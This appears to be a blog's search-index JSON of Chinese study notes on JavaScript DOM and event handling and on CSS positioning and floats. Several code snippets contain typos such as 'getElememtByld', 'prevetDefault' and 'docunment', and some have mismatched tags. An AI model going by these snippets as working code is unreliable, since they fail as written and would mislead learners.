//手机&#125;else&#123; window.location.href=&quot;&quot;; //电脑&#125; 3. history对象 与历史记录进行交互，该对象包含用户（在浏览器窗口中）访问过的url back() 可以后退功能 forward() 前进功能 go(参数) 前进后退功能 参数是1 前进一个页面 如果是-1 后退1个页面","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"js事件","slug":"js/06注册删除事件","date":"2020-05-19T16:00:00.000Z","updated":"2020-05-19T16:00:00.000Z","comments":false,"path":"learningNotes/js/06注册删除事件","link":"learningNotes/js/06注册删除事件","permalink":"https://shylees.github.io/learningNotes/js/06%E6%B3%A8%E5%86%8C%E5%88%A0%E9%99%A4%E4%BA%8B%E4%BB%B6","excerpt":"","text":"1注册事件（绑定事件） 1.1 给元素添加事件 传统方式: 利用on开头的事件/onclick: btn.onclick=function()&#123;&#125; 特点： 注册事件唯一性 （同一个元素上下点击alert，之hi显示后面的那个） 同一个元素同一个事件只能设置一个处理函数，最后注册的处理函数将会覆盖前面注册书的处理函数 监听方式 方法监听注册方式：addEventListener() w3c标准 特点： 同一个元素同一个事件可以注册多个监听器 按注册顺序依次执行上 1.2 事件监听方式： eventTarget.addEventListener(type,listener[,useCapture]) 将指定的监听器注册到eventTarget（目标对象），当该对象触发指定事件时，就会执行事件处理程序 type：事件类型字符串，比如click、mouseover，这里不带on ＋引号 listener：事件处理函数，事件发生时，会调用该监听函数 useCapture：可选参数，是一个布尔值，默认时false。 1.3.attachEvent事件监听方式 eventTarget.attachEvent(eventNameWithOn,callback) 将指定的监听器注册到eventTarget（目标对象上），当该对象触发指定事件时，就会执行事件处理程序 eventNameWithOn：事件类型字符串，比如onclick，这里带on callback：事件处理函数，当目标触发事件时回调函数被调用 ie9以前的版本支持 2.删除事件 2.1事件删除的方式 传统注册方式：eventTarget.onclick=null 监听注册方式： eventTarget.removeEventListener(type,listener[,useCapture]); eventTarget.detachEvent(eventNameWithOn,callback);","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"js获取元素","slug":"js/05DOM事件流","date":"2020-05-19T16:00:00.000Z","updated":"2020-05-19T16:00:00.000Z","comments":false,"path":"learningNotes/js/05DOM事件流","link":"learningNotes/js/05DOM事件流","permalink":"https://shylees.github.io/learningNotes/js/05DOM%E4%BA%8B%E4%BB%B6%E6%B5%81","excerpt":"","text":"DOM事件流 html中的标签都是相互嵌套的，我们可以将元素想象成一个盒子装一个盒子，document是最外面的大盒子。 当你单击一个div时，同时你也单击了div的父元素，甚至整个页面。 那么是先执行父元素的单击事件，还是先执行div的单击事件 ？？？ 其实： 事件流 描述的是从页面中接收事件的顺序； 事件 发生时会在元素节点之间按照待定的顺序传播，这个传播过程就是 DOM 事件流 比如：我们给页面中的一个div注册了单击事件，当你单击了div时，也就单击了body，单击了html，单击了document。 事件冒泡： IE最早提出，事件开始时由最具体的元素接收，然后逐级向上传播到 DOM 最顶层节点的过程 事件捕获： 网景最早提出，由DOM最顶层节点开始，然后逐层向下传播到最具体的元素接收的过程 当时的2大浏览器霸主谁也不服谁！ IE 提出从目标元素开始，然后一层一层向外接收事件并响应，也就是冒泡型事件流。 Netscape（网景公司）提出从最外层开始，然后一层一层向内接收事件并响应，也就是捕获型事件流。 最终，w3c 采用折中的方式，平息了战火，制定了统一的标准 —–— 先捕获再冒泡。 现代浏览器都遵循了此标准，所以当事件发生时，会经历3个阶段。 DOM 事件流会经历3个阶段： 捕获阶段 当前目标阶段 冒泡阶段 我们向水里面扔一块石头，首先它会有一个下降的过程，这个过程就可以理解为从最顶层向事件发生的最具体元素（目标点）的捕获过程；之后会产生泡泡，会在最低点（ 最具体元素）之后漂浮到水面上，这个过程相当于事件冒泡。","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"js获取元素","slug":"js/07事件对象","date":"2020-05-19T16:00:00.000Z","updated":"2020-05-20T16:00:00.000Z","comments":false,"path":"learningNotes/js/07事件对象","link":"learningNotes/js/07事件对象","permalink":"https://shylees.github.io/learningNotes/js/07%E4%BA%8B%E4%BB%B6%E5%AF%B9%E8%B1%A1","excerpt":"","text":"1. DOM事件流 dom 事件流 三个阶段： JS 代码中只能执行捕获或者冒泡其中的一个阶段。 onclick 和 attachEvent（ie） 只能得到冒泡阶段。 捕获阶段 如果addEventListener 第三个参数是 true 那么则处于捕获阶段 document -&gt; html -&gt; body -&gt; father -&gt; son 冒泡阶段 如果addEventListener 第三个参数是 false 或者 省略 那么则处于冒泡阶段 son -&gt; father -&gt;body -&gt; html -&gt; document 2. 事件对象 event就是一个事件对象 div.onclick=function(event)&#123;&#125; |div.addEventListenter('click',function(event) &#123;&#125; ) 事件对象只有有了事件才会存在，是系统给我们自动创建的 事件对象 是 事件的一系列相关数据的集合 跟事件相关的 （eg：鼠标点击 包含鼠标坐标。。。 if键盘事件 包含按下哪个键） 这个事件对象可以自己命名，比如event-&gt;e 兼容性 ie678 window.event 3. 事件对象常见的属性和方法 属性|方法 行为 标准 e.target 返回 触发 事件的对象 标准 e.srcElement 返回 触发 事件的对象 非标准 ie678使用 e.type 返回时间的类型 e.cancelBubble 阻止冒泡 非标准 ie678使用 e.stopPropagation() 阻止冒泡 标准 e.reutrnValue 阻止默认事件/行为 非标准 ie678使用 e.preventDefault() 阻止默认事件/行为 标准 4. 事件委托（代理/委派）（冒泡好处）： 原理：不给每个节点单独是设置事件监听器，而是将事件监听器设置再其父结点上，然后利用冒泡原理影响设置每个子节点 作用：只操作了一次DOM，提高了程序的性能 事件委托的核心原理：给父节点添加侦听器， 利用事件冒泡影响每一个子节点 比如：给ul注册事件，然后利用事件对象的target来找到当前点击的li，以为点击li，事件会冒泡到ul上，ul有注册事件，就会触发监听器 1234567891011121314&lt;ul&gt; &lt;li&gt;xxx&lt;/li&gt; &lt;li&gt;xxx&lt;/li&gt; &lt;li&gt;xxx&lt;/li&gt; &lt;li&gt;xxx&lt;/li&gt; &lt;li&gt;xxx&lt;/li&gt;&lt;/ul&gt;&lt;script&gt;var ul=document.querySelector(&#x27;ul&#x27;);ul.addEventListener(&#x27;click&#x27;,function(e)&#123; // e.target 这个可以得到我们点击的对象 点哪个哪个背景变色 e.target.style.backgroundColor=&#x27;pink&#x27;;&#125;)&lt;/script&gt; 5. 常用的鼠标事件 5.1 禁用默认选项（了解） 禁止鼠标右键菜单：contextmenu主要控制应该何时显示上下菜单，主要用于程序员取消默认的上下文菜单 123document.addEventListener(&#x27;contextmenu&#x27;,function(e)&#123; e.prevetDefault();&#125;) 禁止选中文字：selectstart 开始选中 123document.addEventListener(&#x27;selectstart&#x27;,function(e)&#123; e.prevetDefault();&#125;) 5.2 鼠标事件对象 event对象代表时间的状态，跟事件相关的一系列信息的集合。现阶段主要是鼠标事件MouseEvent 何键盘事件KEyboardEvent e.clientX 返回鼠标相对于浏览器窗口可视区的X坐标 e.clientY 返回鼠标相对于浏览器窗口可视区的Y坐标 e.pageX 返回鼠标相对于文档页面的X坐标 IE9+支持 e.pageY 返回鼠标相对于文档页面的Y坐标 IE9+支持 e.screenX 返回鼠标相对于电脑屏幕的X坐标 e.screenY 返回鼠标相对于电脑屏幕的Y坐标 6.常用的键盘事件 6.1键盘事件对象 onkeyup 某个键盘按键时被松开时触发 onkeydown 某个键盘按键被按下时触发 onkeypress 某个键盘按键被按下时 触发 但不识别功能键（ctrl shift） 三个事件的顺序：keydowm–keypress–keyup 注：keydown和keypress在文本框里的特点：他们两个事件触发时，文字还没有落入文本框中 keyup事件触发时，文字就已经落入文本框里了 8.2键盘事件对象 keyCode 返回该键的ASCLL值 key 返回按下的值 onkeydown 和 onkeyup不区分字母大小写，onkeypress区分字母大小写 在实际开发中，我们更多的使用keydown和keyup 它能识别所有的键（包括包括功能键） keypress不识别功能键，但是keyCode属性区分大小写，返回不同的ASCLL值","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"js节点操作","slug":"js/04节点操作","date":"2020-05-16T16:00:00.000Z","updated":"2020-05-16T16:00:00.000Z","comments":false,"path":"learningNotes/js/04节点操作","link":"learningNotes/js/04节点操作","permalink":"https://shylees.github.io/learningNotes/js/04%E8%8A%82%E7%82%B9%E6%93%8D%E4%BD%9C","excerpt":"","text":"为什么学节点操作： 通常获取元素是 ​ 利用dom提供的方法获取元素：document. getElementById()… //繁琐逻辑性不强 ​ 利用节点层级关系获取元素：父子兄节点关系 //逻辑性强 2.节点概述 便签、属性、文本、注释等都是节点 一般地，节点至少有nodeType（节点类型）、nodeName(节点名称)、nodeValue（节点值） 元素节点 nodeType=1 属性节点 nodeType=2 文本节点 nodeType=3（文本节点包含文字、空格、换行等） 主要操作元素节点 3.节点层级 父级节点：parentNode 得到的是离元素最近的父级节点（亲爸爸） 找不到就返回为null 1234567&lt;div class=&quot;box&quot;&gt; &lt;sapn class=&quot;erweima&quot;&gt;×&lt;/span&gt;&lt;/div&gt;var erweima=document.querySelector(&#x27;.erweima&#x27;);//var box=document.querySelector(&#x27;.box&#x27;); //=erweima.parentNode;//console.log(box)=console.log(erweima.parentNode)； 子节点： parentNode.childNodes(标准) //返回所有子节点 parentnode.children(非标准) //只返回元素节点 是一个只读属性 兼容性ie9: parentNode.firstChild | parentNode.lastChild //返回第一个/最后一个子节点 parentNode.firstElementChild | parentNode.lastElementChild //返回第一/最后一个元素节点 parentNode.children[0] | parentNode.children[parentNode.children.length-1] //实际开发常用 兄弟节点 node.nextSibling 返回下一个兄弟节点 包含所有节点 node.previousSibling 返回当前元素上一个兄弟节点 包含所有节点 兼容性ie9: node.nextElementSibling 返回当前元素下一个兄弟元素节点 node.previousElementSibling 返回当前元素上一个兄弟元素节点 4. 创建节点 document.createElement('tagName') 方法创建由tagName指定的HTML元素，因为这些元素原先不存在，是根据我们的需求动态生成的，所以我们也称为动态创建元素节点 5.添加节点 node.appendChild(child) node父级 child子级 将一个节点添加到指定父节点的子节点的子节点列表末尾，类似于css里面的after伪元素 node.insertBefore(child,指定元素) 方法将一个节点添加到父子点的指定子节点前面，类似于css里面的before伪元素 6.删除节点 node.removeChild(child) 从dom中删除一个字节点 返回删除的节点 阻止链接跳转需要添加javascript:void(0);或者javascript: ; 7.复制节点 node.cloneNode() 返回调用改方法节点的一个副本 括号参数为空/false 为浅拷贝 只复制节点本身 不克隆里面的子节点（文本） node.cloneNode(true) 括号为true 深拷贝 复制标签 复制里面的内容 8.三种动态创建元素的区别 ​ 1. document.write() 页面文档流加载完毕，使用 会使文档流重绘 element.innerHTML document.createElement() 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 后两个在添加少数时无区别 但多个时//1. innerHTML: 3019msfunction fn()&#123; var d1=+new Date(); var str=&quot;&quot;; for(var i=0;i&lt;1000;i++)&#123; //拼接 document.body.innerHTML+=&#x27;&lt;div style=&quot;width:100px; height:2px; boder:1px solid blue;&quot;&gt;&#x27;; &#125; var d2=+new Date(); console.log(d2-d1);&#125;fn();//document.createElement() 20+msfunction fn()&#123; var d1=+new Date(); for(var i=0;i&lt;1000;i++)&#123; var div=document.createElement(&#x27;div&#x27;); div.style.width=&#x27;100px&#x27;; div.style.height=&#x27;2px&#x27;; div.style.border=&#x27;1px solid red&#x27;; document.body.appendChild(div); //创建 增加 &#125; var d2=+new Date(); console.log(d2-d1);&#125;fn();//3. innerHTML用数组 10-msfunction fn()&#123; var d1=+new Date(); var array=[ ]; for(var i=0;i&lt;1000;i++)&#123; //拼接 array.push(&#x27;&lt;div style=&quot;width:100px; height:2px; boder:1px solid blue;&quot;&gt;&#x27;); &#125; document.body.innerHTML=array.join(&#x27;&#x27;); var d2=+new Date(); console.log(d2-d1);&#125;fn();","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"js事件操作","slug":"js/03事件操作","date":"2020-05-13T16:00:00.000Z","updated":"2020-05-15T16:00:00.000Z","comments":false,"path":"learningNotes/js/03事件操作","link":"learningNotes/js/03事件操作","permalink":"https://shylees.github.io/learningNotes/js/03%E4%BA%8B%E4%BB%B6%E6%93%8D%E4%BD%9C","excerpt":"","text":"1.改变元素内容 element.innerText 从起始位置到终止位置的内容，但它去除html标签，同时空格和换行也会去掉 element.innerHTML 起始位置到终止位置的全部内容，包括html标签，同时保留空格和换行 innerText 和 innerHTML ： innerText 不识别 html 标签 非标准 去除空格和换行 innerHTML 识别html代码 W3C标准 保留空格和换行 这两个属性是可读写的 可以获取元素里的内容 2.改变元素属性 element.属性='属性值' 3.表单元素的属性操作 （type、value、checked、selected、disabled禁用） input.type/value/checked/selected/disabled='' 1234567891011121314// &lt;button&gt;按钮&lt;button&gt;// &lt;input type=&quot;text&quot; value=&quot;输入内容&quot;&gt;//1.获取元素var btn=docunment.querySelector(&#x27;button&#x27;);var input=document.quertSelsector(&#x27;input&#x27;);//2.注册事件 处理程序btn.onclick=function()&#123; //input.innerHTML=&#x27;点击了&#x27;；这个是 普通盒子 比如标签里面的内容 //表单里面的值 文字内容是通过 value 来修改的 input.value=&#x27;被点击了&#x27;； //如果想要某个表单被禁用 disabled this.disabled=ture;//==btn.disabled=true; //this 指向的是事件函数的调用者&#125; 4.样式属性操作 element.style 行内样式操作 样式少 功能简单 element.className 类名样式操作 多 样式多 功能复杂 4.1 element.style 样式用驼峰命名法 比如fontSize JS修改的style样式操作 产生行内样式 css权重较高 12345678910// div&#123; width:200px; height:200px; background-color:pink; &#125;&lt;div&gt;&lt;/div&gt;//1.获取元素var div=document.querySelector(&#x27;div&#x27;);//2.div.onclick=function()&#123;//div.style this.style.backgroundColor=&#x27;purple&#x27;; this.style.width=&#x27;250px&#x27;;&#125; 4.2 element.className 覆盖所有类名 123456789.change&#123; ....... &#125;// &lt;div class=&quot;first&quot;&gt;文本&lt;div&gt;var test=document.querySelector(&#x27;div&#x27;);text.onclick=function()&#123; //当前元素的类名 改为change this.className=&#x27;change&#x27;; //if想保留原先类名 this.className=&#x27;first change&#x27;;&#125; 5.操作元素之排他思想 123456789101112131415161718192021&lt;button&gt;按钮&lt;/button&gt;&lt;button&gt;按钮&lt;/button&gt;&lt;button&gt;按钮&lt;/button&gt;&lt;button&gt;按钮&lt;/button&gt;&lt;button&gt;按钮&lt;/button&gt;&lt;script&gt; //1.获取元素 var btns = document.querySelectorAll(&#x27;button&#x27;); //btns得到的是伪数组 里面的每一个元素 btns[i] for (var i = 0; i &lt; btns.length; i++) &#123; btns[i].onclick = function() &#123; // console.log(&quot;第&quot; + + &quot;被点击了&quot;); for (var i = 0; i &lt; btns.length; i++) &#123; // btns[i].style.background = &#x27;none&#x27;; btns[i].style.backgroundColor = &#x27;&#x27;; &#125; this.style.backgroundColor = &#x27;pink&#x27;; &#125; &#125;&lt;/script&gt; 6.自定义属性的操作 获取属性值 element.属性： 内置的属性 element.getAttribute('属性') ：主要获取自定义属性 设置属性值 element.属性='值'：主要内置属性 element.setAttribute('属性'，'值'): 主要自定义属性 移除属性 element.removeAttribute(‘属性’); 7. h5自定义属性 设置h5自定义属性 h5自定义属性data-开头作为属性名并且赋值 &lt;div data-index=&quot;1&quot;&gt;&lt;/div&gt; / element.setAttribute('data-index',2); 获取h5自定义属性 兼容性获取: element.getAttribute(‘data-index’); h5新增: element.dataset.index或者element.dataset[‘index’] dataset是一个集合里存放了所有以data开头的自定义属性 //多个用驼峰式命名 自定义属性为 data-list-name=‘andy’ element.getAttribute(‘data-list-name’) element.dataset.listName element.dataset[‘listName’]","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"js获取元素","slug":"js/01获取元素","date":"2020-05-11T16:00:00.000Z","updated":"2020-05-11T16:00:00.000Z","comments":false,"path":"learningNotes/js/01获取元素","link":"learningNotes/js/01获取元素","permalink":"https://shylees.github.io/learningNotes/js/01%E8%8E%B7%E5%8F%96%E5%85%83%E7%B4%A0","excerpt":"","text":"根据ID获取：var elememt=document.getElememtByld(id); 返回值：object 元素对象 12// &lt;div id=&#x27;time&#x27;&gt;2019-9-9&lt;/div&gt;var timer=document.getElememtByld(&#x27;time&#x27;); 根据标签名获取： document.getElememtsByTagName('标签名'); 返回带有指定标签名的对象的集合 返回值：获取过来元素对象集合 以伪数组的形式储存 1234567// &lt;ul&gt; &lt;li&gt;xxxxxx&lt;li&gt; &lt;li&gt;xxxxxx&lt;li&gt; &lt;li&gt;xxxxxx&lt;li&gt; &lt;/ul&gt; var lis=document.getElememtsByTagName(&#x27;li&#x27;); // 因为是集合，所以if操作里面的元素可遍历 for(var i=0;i&lt;lis.length;i++)&#123; console.log(lis[i]) &#125; 得到元素里面的某些标签：elememt.getElememtsByTagName('标签名'); 12345678// &lt;ul&gt;// &lt;li&gt;xxxxxx&lt;li&gt;&lt;li&gt;xxxxxx&lt;li&gt;&lt;li&gt;xxxxxx&lt;li&gt;// &lt;/ul&gt;// &lt;ul id=&#x27;nav&#x27;&gt;// &lt;li&gt;ooooo&lt;li&gt;&lt;li&gt;oooo&lt;li&gt;&lt;li&gt;ooooo&lt;li&gt;// &lt;/ul&gt;var nav=document.getElememtByld(&#x27;nav&#x27;);var navLis=nav.getElememtsByTagName(&#x27;li&#x27;); 通过类名获取：document.getElememtsByClassName('类名'); 根据类名返回元素对象集合 同上伪数组形式存储 12345// &lt;div class=&#x27;box&#x27;&gt;盒子&lt;/div&gt;// &lt;div class=&#x27;box&#x27;&gt;盒子&lt;/div&gt;// &lt;div id=&#x27;nav&#x27;&gt; &lt;ul&gt; &lt;li&gt;首页&lt;/li&gt; &lt;li&gt;产品&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;var boxs=document.getElememtsByClassName(&#x27;box&#x27;); 根据选择器获取（一个）：document.querySelector('选择器'); 返回指定选择器的第一个元素对象 要加符号 1234567// &lt;div class=&#x27;box&#x27;&gt;盒子1&lt;/div&gt;// &lt;div class=&#x27;box&#x27;&gt;盒子2&lt;/div&gt;// &lt;div id=&#x27;nav&#x27;&gt; &lt;ul&gt; &lt;li&gt;首页&lt;/li&gt; &lt;li&gt;产品&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;var firstBox=document.querySelector(&#x27;.box&#x27;);var nav=document.querySelector(&#x27;#nav&#x27;);var li=document.querySelector(&#x27;li&#x27;); 根据选择器获取（所有）：document.querySelectorAll('选择器'); 返回指定选择器的所有元素对象 要加符号 123456// &lt;div class=&#x27;box&#x27;&gt;盒子1&lt;/div&gt;// &lt;div class=&#x27;box&#x27;&gt;盒子2&lt;/div&gt;// &lt;div id=&#x27;nav&#x27;&gt; &lt;ul&gt; &lt;li&gt;首页&lt;/li&gt; &lt;li&gt;产品&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;var allBox=document.querySelectorAll(&#x27;.box&#x27;);var lis=document.querySelectorAll(&#x27;li&#x27;); 获取body元素：document.body 获取html元素：document.documentElememt","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"js事件基础","slug":"js/02事件基础","date":"2020-05-11T16:00:00.000Z","updated":"2020-05-11T16:00:00.000Z","comments":false,"path":"learningNotes/js/02事件基础","link":"learningNotes/js/02事件基础","permalink":"https://shylees.github.io/learningNotes/js/02%E4%BA%8B%E4%BB%B6%E5%9F%BA%E7%A1%80","excerpt":"","text":"1.事件基础： 简单理解为：触发–相应机制 2.事件组成： 事件源 事件类型 事件处理程序–事件三要素 123456789 // &lt;botton id=&quot;btn&quot;&gt;按钮&lt;/button&gt; //1.事件源 事件被触发的对象var btn=document.getElementById(&#x27;btn&#x27;);//2.事件类型 如何触发 事件：鼠标点击onclick//3.事件处理程序 通过一个函数赋值的方式 完成btn.onclick=function()&#123; console.log(&#x27;点击按钮&#x27;); &#125; 3.执行事件的步骤： 获取事件源 注册事件（绑定事件） 添加事件处理程序（采用函数赋值形式） 4.常见鼠标事件： onclick 点击左键 onmouseover 鼠标经过 onmouseout 鼠标离开 onfocus 获得鼠标焦点 onblur 失去鼠标焦点 onmousemove 鼠标移动 onmouseup 鼠标弹起 onmousedown 鼠标按下","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"position","slug":"further/position","date":"2020-03-27T16:00:00.000Z","updated":"2020-03-27T16:00:00.000Z","comments":false,"path":"learningNotes/further/position","link":"learningNotes/further/position","permalink":"https://shylees.github.io/learningNotes/further/position","excerpt":"","text":"css position 属性用于指定一个元素在文档中的定位方式。top、right、bottom、left 属性决定了该元素的最终位置。 定位类型 static 指定元素使用正常的布局行为，即元素在文档常规流中当前的布局位置。 此时 top, right, bottom, left 和 z-index 属性无效。 relative 元素先放置在未添加定位时的位置，再在不改变页面布局的前提下调整元素位置（因此会在此元素未添加定位时所在位置留下空白）。 position:relative 对 table-*-group, table-row, table-column, table-cell, table-caption 元素无效。 absolute 元素会被移出正常文档流，并不为元素预留空间，通过指定元素相对于最近的非 static 定位祖先元素的偏移，来确定元素位置。 绝对定位的元素可以设置外边距（margins），且不会与其他边距合并。 fixed 元素会被移出正常文档流，并不为元素预留空间，而是通过指定元素相对于屏幕视口（viewport）的位置来指定元素位置。元素的位置在屏幕滚动时不会改变。打印时，元素会出现在的每页的固定位置。 fixed 属性会创建新的层叠上下文。当元素祖先的 transform, perspective 或 filter 属性非 none 时，容器由视口改为该祖先。 stick 元素根据正常文档流进行定位，然后相对它的*最近滚动祖先（nearest scrolling ancestor）*和 containing block (最近块级祖先 nearest block-level ancestor)，包括table-related元素，基于top, right, bottom, 和 left的值进行偏移。偏移值不会影响任何其他元素的位置。 须指定 top, right, bottom或left四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。 定位的特殊性 绝对定位和固定定位和浮动相似： 行内元素添加绝对/固定定位，可直接设置宽高 块级元素添加绝对/固定定位，if不给宽/高，默认大小是内容大小 脱标（浮动/绝对/固定）的盒子不会触发外边距塌陷","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"css","slug":"css","permalink":"https://shylees.github.io/tags/css/"}]},{"title":"浮动和清除浮动","slug":"further/浮动 和 清除 浮动","date":"2020-03-25T16:00:00.000Z","updated":"2020-03-25T16:00:00.000Z","comments":false,"path":"learningNotes/further/浮动 和 清除 浮动","link":"learningNotes/further/浮动 和 清除 浮动","permalink":"https://shylees.github.io/learningNotes/further/%E6%B5%AE%E5%8A%A8%20%E5%92%8C%20%E6%B8%85%E9%99%A4%20%E6%B5%AE%E5%8A%A8","excerpt":"","text":"1.浮动是什么 float CSS属性指定一个元素应沿其容器的左侧或右侧放置，允许文本和内联元素环绕它。该元素从网页的正常流动(文档流)中移除，尽管仍然保持部分的流动性。 2. 值 left 表明元素必须浮动在其所在的块容器左侧的关键字。 right 表明元素必须浮动在其所在的块容器右侧的关键字。 none 表明元素不进行浮动的关键字。 inline-start 关键字，表明元素必须浮动在其所在块容器的开始一侧，在ltr脚本中是左侧，在rtl脚本中是右侧。 inline-end 关键字，表明元素必须浮动在其所在块容器的结束一侧，在ltr脚本中是右侧，在rtl脚本中是左侧。 3.浮动的特性 脱离标准流 浮动的元素之间不会有缝隙 浮动元素具有行内块特征 4.为什么要清除浮动 一般在使用浮动的时候：父元素是标准流的，而且一般不设置高度，而其子元素都设置为浮动的话，父元素高度塌陷 == 0。会影响到父元素下面的兄弟元素在文档中的位置（一般其兄弟元素会被浮动元素叠在下面）。 5.清除浮动的方法 额外标签法： 在所有浮动元素后面加一个元素，如div，为这个块级元素添加 clear:both; 的样式 ::after 伪元素： 1234567891011.clearfix::after&#123; /* .clearfix 是标准流的父元素 */ content: &quot; &quot;; display: block; height: 0; clear: both;&#125;.clearfix&#123; *zoom: 1; /* 触发hasLayout 兼容ie6、7 */&#125; 双伪元素： 123456789101112.clearfix::before, .clearfix::after&#123; content: &quot; &quot;; display: table;&#125;.clearfix::after&#123; clear: both;&#125;.clearfix&#123; *zoom: 1;&#125; 父元素触发BFC： 最常见的做法是将父元素的 overflow 设置为除 visible 的值。 可以根据不同页面的需求使用不同的方法触发父元素BFC，在不同的场景有的方法可能不能起到清除浮动的效果。","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"css","slug":"css","permalink":"https://shylees.github.io/tags/css/"}]}],"categories":[{"name":"workNotes","slug":"workNotes","permalink":"https://shylees.github.io/categories/workNotes/"},{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"},{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"},{"name":"readNotes","slug":"readNotes","permalink":"https://shylees.github.io/categories/readNotes/"}],"tags":[{"name":"html","slug":"html","permalink":"https://shylees.github.io/tags/html/"},{"name":"ssr","slug":"ssr","permalink":"https://shylees.github.io/tags/ssr/"},{"name":"nuxtjs","slug":"nuxtjs","permalink":"https://shylees.github.io/tags/nuxtjs/"},{"name":"网络","slug":"网络","permalink":"https://shylees.github.io/tags/%E7%BD%91%E7%BB%9C/"},{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"},{"name":"闭包","slug":"闭包","permalink":"https://shylees.github.io/tags/%E9%97%AD%E5%8C%85/"},{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"},{"name":"css","slug":"css","permalink":"https://shylees.github.io/tags/css/"},{"name":"青训营","slug":"青训营","permalink":"https://shylees.github.io/tags/%E9%9D%92%E8%AE%AD%E8%90%A5/"},{"name":"前端安全","slug":"前端安全","permalink":"https://shylees.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"},{"name":"webpack","slug":"webpack","permalink":"https://shylees.github.io/tags/webpack/"},{"name":"nodejs","slug":"nodejs","permalink":"https://shylees.github.io/tags/nodejs/"},{"name":"html5","slug":"html5","permalink":"https://shylees.github.io/tags/html5/"},{"name":"es6","slug":"es6","permalink":"https://shylees.github.io/tags/es6/"},{"name":"promise","slug":"promise","permalink":"https://shylees.github.io/tags/promise/"},{"name":"http","slug":"http","permalink":"https://shylees.github.io/tags/http/"},{"name":"小程序","slug":"小程序","permalink":"https://shylees.github.io/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"js组件","slug":"js组件","permalink":"https://shylees.github.io/tags/js%E7%BB%84%E4%BB%B6/"},{"name":"jQuery","slug":"jQuery","permalink":"https://shylees.github.io/tags/jQuery/"}]}